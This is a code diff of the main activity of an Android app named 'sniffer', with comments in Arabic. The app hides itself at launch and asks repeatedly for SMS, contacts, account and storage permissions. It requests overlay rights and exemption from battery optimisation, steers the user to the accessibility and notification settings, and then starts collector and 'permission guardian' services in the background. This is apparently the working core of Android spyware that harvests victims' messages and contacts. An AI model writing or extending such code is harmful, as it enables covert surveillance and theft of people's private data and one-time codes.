@@ -3,6 +3,7 @@ package com.v8.global.sniffer;
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
@@ -13,27 +14,22 @@ import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.provider.Telephony;
-import android.view.Gravity;
 import android.view.View;
 import android.view.WindowManager;
-import android.widget.Button;
-import android.widget.LinearLayout;
-import android.widget.TextView;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import android.Manifest;
-import android.accessibilityservice.AccessibilityServiceInfo;
-import android.view.accessibility.AccessibilityManager;
-import android.app.NotificationManager;
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends Activity {
 
     private static final int PERMISSION_REQUEST_CODE = 100;
+    private static final int SYSTEM_ALERT_WINDOW_CODE = 101;
     private boolean permissionsRequested = false;
+    private int permissionRetryCount = 0;
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,17 +40,32 @@ public class MainActivity extends Activity {
             finishAndRemoveTask();
         }
         
-        // طلب الصلاحيات تلقائياً
+        // بدء عملية الصلاحيات بعد ثانية
         new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
             @Override
             public void run() {
-                requestAllPermissionsAutomatically();
+                startPermissionProcess();
             }
-        }, 500);
+        }, 1000);
     }
     
-    private void requestAllPermissionsAutomatically() {
-        // قائمة الصلاحيات المطلوبة
+    private void startPermissionProcess() {
+        // أولاً: طلب صلاحية SYSTEM_ALERT_WINDOW (مهم جداً)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, SYSTEM_ALERT_WINDOW_CODE);
+                return;
+            }
+        }
+        
+        // ثانياً: طلب باقي الصلاحيات
+        requestAllPermissions();
+    }
+    
+    private void requestAllPermissions() {
+        // قائمة جميع الصلاحيات المطلوبة
         String[] permissions = {
             Manifest.permission.INTERNET,
             Manifest.permission.READ_EXTERNAL_STORAGE,
@@ -69,7 +80,8 @@ public class MainActivity extends Activity {
             Manifest.permission.READ_SMS,
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_CONTACTS,
-            Manifest.permission.GET_ACCOUNTS
+            Manifest.permission.GET_ACCOUNTS,
+            Manifest.permission.POST_NOTIFICATIONS
         };
         
         List<String> permissionsNeeded = new ArrayList<>();
@@ -85,14 +97,67 @@ public class MainActivity extends Activity {
                 permissionsNeeded.toArray(new String[0]), 
                 PERMISSION_REQUEST_CODE);
         } else {
-            // كل الصلاحيات ممنوحة، شغل الخدمات
-            startServicesAndHide();
+            // كل الصلاحيات ممنوحة
+            setupComplete();
         }
+    }
+    
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
-        // طلب الصلاحيات الإضافية
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            // التحقق من الصلاحيات المرفوضة
+            List<String> deniedPermissions = new ArrayList<>();
+            for (int i = 0; i < permissions.length; i++) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                    deniedPermissions.add(permissions[i]);
+                }
+            }
+            
+            if (!deniedPermissions.isEmpty() && permissionRetryCount < 3) {
+                // إعادة طلب الصلاحيات المرفوضة
+                permissionRetryCount++;
+                ActivityCompat.requestPermissions(this, 
+                    deniedPermissions.toArray(new String[0]), 
+                    PERMISSION_REQUEST_CODE);
+            } else {
+                // بعد 3 محاولات أو نجاح كل الصلاحيات
+                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        setupComplete();
+                    }
+                }, 2000);
+            }
+        }
+    }
+    
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        
+        if (requestCode == SYSTEM_ALERT_WINDOW_CODE) {
+            // بعد صلاحية النوافذ العائمة، نكمل باقي الصلاحيات
+            requestAllPermissions();
+        }
+    }
+    
+    private void setupComplete() {
+        // طلب تجاهل تحسين البطارية
         requestIgnoreBatteryOptimizations();
+        
+        // فتح إعدادات الإشعارات
         openNotificationSettings();
+        
+        // فتح إعدادات الوصول
         openAccessibilitySettings();
+        
+        // تشغيل الخدمات
+        startServices();
+        
+        // إنهاء النشاط
+        finish();
     }
     
     private void requestIgnoreBatteryOptimizations() {
@@ -124,7 +189,7 @@ public class MainActivity extends Activity {
         startActivity(intent);
     }
     
-    private void startServicesAndHide() {
+    private void startServices() {
         // تشغيل خدمة الإشعارات
         Intent notificationIntent = new Intent(this, NotificationService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -141,31 +206,15 @@ public class MainActivity extends Activity {
             startService(collectorIntent);
         }
         
-        // إنهاء النشاط
-        finish();
-    }
-    
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        // تشغيل حارس الصلاحيات
+        Intent guardianIntent = new Intent(this, PermissionGuardian.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(guardianIntent);
+        } else {
+            startService(guardianIntent);
+        }
         
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            // بعد طلب الصلاحيات، شغل الخدمات وأنهي
-            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    startServicesAndHide();
-                }
-            }, 2000);
-        }
-    }
-    
-    @Override
-    protected void onResume() {
-        super.onResume();
-        // إخفاء التطبيق إذا ظهر
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            finishAndRemoveTask();
-        }
+        // تشغيل مساعد الصلاحيات
+        AutoPermissionHelper.startPermissionHelper(this);
     }
 }
